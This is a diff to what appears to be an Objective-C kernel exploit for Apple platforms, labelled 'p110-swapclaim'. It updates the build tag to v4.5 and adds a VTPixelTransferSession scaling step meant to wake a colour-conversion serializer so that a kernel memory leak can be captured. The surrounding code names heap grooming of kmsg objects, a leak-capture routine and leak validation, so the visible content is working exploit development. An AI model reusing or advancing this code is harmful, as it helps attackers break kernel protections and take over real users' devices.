@@ -107,7 +107,7 @@ static void p110_flushCB(void *r, void *e, OSStatus st, VTEncodeInfoFlags f, CMS
 #import <IOKit/IOKitLib.h>       /* dlsym'd calls still; only the UC types  */
 #import <sys/qos.h>
 
-#define P110_BUILD      @"p110-swapclaim-v4.4-decodecodec"
+#define P110_BUILD      @"p110-swapclaim-v4.5-scalearm"
 #define P110_GROOM_KDATA 0x1000        /* the groom kmsg's kdata size       */
 #define P110_ROUNDS     64
 #define P110_PREFILL_MAX  8     /* bandit arm room: prefill 6 (default) vs 8 */
@@ -839,6 +839,33 @@ static BOOL p110_leak_capture(NSString *tag, BOOL print, P110LeakSnap *snap) {
                (wakeCodec == kCMVideoCodecType_H264) ? @"h264" : @"hevc",
                dec, g_p110_wakeSbN > 0 ? 3 : 0, (int)dstCreate,
                (int)dstErr[0], (int)dstErr[1], (int)dstErr[2]);
+            /* v4.5 SCALE-ARM: VTPixelTransferSession IS the scaler API. The
+               v4.4 run proved encode (samples=1) + decode (1 frame) both
+               succeed and the serializer STAYS asleep — so the CSC wake must
+               come from a real scaled transfer, not the codec pipeline. */
+            int xst = -1;
+            {
+                VTPixelTransferSessionRef ts = NULL;
+                if (VTPixelTransferSessionCreate(kCFAllocatorDefault, &ts) == noErr && ts) {
+                    CVPixelBufferRef xsrc = NULL, xdst = NULL;
+                    NSDictionary *xattrs = @{ (id)kCVPixelBufferIOSurfacePropertiesKey: @{} };
+                    if (CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
+                            kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
+                            (__bridge CFDictionaryRef)xattrs, &xsrc) == noErr && xsrc &&
+                        CVPixelBufferCreate(kCFAllocatorDefault, 640, 360,
+                            kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
+                            (__bridge CFDictionaryRef)xattrs, &xdst) == noErr && xdst) {
+                        xst = (int)VTPixelTransferSessionTransferImage(ts, xsrc, xdst);
+                    }
+                    if (xsrc) CVPixelBufferRelease(xsrc);
+                    if (xdst) CVPixelBufferRelease(xdst);
+                    VTPixelTransferSessionInvalidate(ts);
+                    CFRelease(ts);
+                }
+            }
+            Lf(@"[leak] SCALE-ARM [VTPixelTransferSession 1280x720->640x360]: st=%d "
+               @"(0 = the scale path ran; the next [leak validate] is the verdict)",
+               xst);
             in64 = (uint64_t)(uintptr_t)g_p110_leak_out;
             memset(g_p110_leak_out, 0, sizeof(g_p110_leak_out));
             outLen = sizeof(g_p110_leak_out);
